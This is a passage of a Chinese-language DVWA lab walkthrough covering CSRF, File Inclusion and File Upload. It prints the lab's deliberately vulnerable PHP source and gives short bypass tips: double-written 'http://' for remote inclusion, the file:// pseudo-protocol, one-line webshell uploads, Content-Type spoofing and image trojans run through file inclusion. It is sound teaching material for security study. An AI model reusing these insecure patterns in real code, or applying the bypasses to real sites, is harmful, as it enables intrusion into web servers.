	<span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise current password input</span>
	<span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check that the current password is correct</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass_curr</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Do both new passwords match and does the current password match the user?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// It does!</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Update database with new password</span>
		<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass_new</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for the user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Issue with passwords matching</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>源码中看到需要输入当前密码才能进行密码修改，如果当前密码不成功，则不进行数据库密码更改操作，因此不可能进行跨站请求伪造的行为。</p> 
</blockquote> 
<h2><a id="File_Inclusion_613"></a>四、File Inclusion</h2> 
<h3><a id="1Low_614"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/8f/ee/ZXVvx1uv_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span> 
</code></pre> 
<h3><a id="2Medium_626"></a>2、Medium</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// Input validation</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"http://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"https://"</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"..\\"</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>将…/，http://等置空，对本地包含绝对路径没有影响，如果要使用http远程包含，直接双写绕过。<br> <img src="https://images2.imgbox.com/4f/2c/Dopa2Y2P_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h3><a id="3High_645"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// The page we wish to display</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// Input validation</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fnmatch</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"file*"</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"include.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// This isn't the page we want!</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR: File not found!"</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>使用fnmatch()匹配file开头的字符串，伪协议file://即可</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/91/93/mnkuGL3u_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="File_Upload_668"></a>五、File Upload</h2> 
<h3><a id="1Low_669"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/5e/60/BCLAmJ1Z_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/48/a9/1b3homUC_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Where are we going to be writing to?</span>
	<span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
	<span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Can we move the file to the upload folder?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// No</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Yes!</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>直接接收文件，并且保存到网站根目录下hackable/uploads目录下，直接传一句话木马即可。</p> 
</blockquote> 
<h3><a id="2Medium_700"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/63/f8/7TN3V83X_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Where are we going to be writing to?</span>
	<span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
	<span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// File information</span>
	<span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Is it an image?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

		<span class="token comment">// Can we move the file to the upload folder?</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// No</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// Yes!</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Invalid file</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>只是对上传的type进行了检测，必须是jpeg或png，直接修改Content-Type即可。</p> 
</blockquote> 
<h3><a id="3High_743"></a>3、High</h3> 
<p><img src="https://images2.imgbox.com/30/c9/RqJA5OhI_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>然后将图片马上传，这样肯定是不够的，因为还得让图片被PHP代码解析，才能触发里面的一句话木马，可以利用文件包含漏洞，解析图片。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/6d/47/lTpJ2a6f_o.png" alt="在这里插入图片描述"></p> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Where are we going to be writing to?</span>
	<span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"hackable/uploads/"</span><span class="token punctuation">;</span>
	<span class="token variable">$target_path</span> <span class="token operator">.=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// File information</span>
	<span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Is it an image?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">getimagesize</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

		<span class="token comment">// Can we move the file to the upload folder?</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// No</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// Yes!</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Invalid file</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>通过截断符，截断文件名最后一个.前面的字符，同时使用getimagesize()获取图像信息，因此只能上传图片马。</p> 
</blockquote> 
<h3><a id="4Impossible_793"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">// File information</span>
	<span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Where are we going to be writing to?</span>
	<span class="token variable">$target_path</span>   <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'hackable/uploads/'</span><span class="token punctuation">;</span>
	<span class="token comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span>
	<span class="token variable">$target_file</span>   <span class="token operator">=</span>  <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>
	<span class="token variable">$temp_file</span>     <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span> <span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
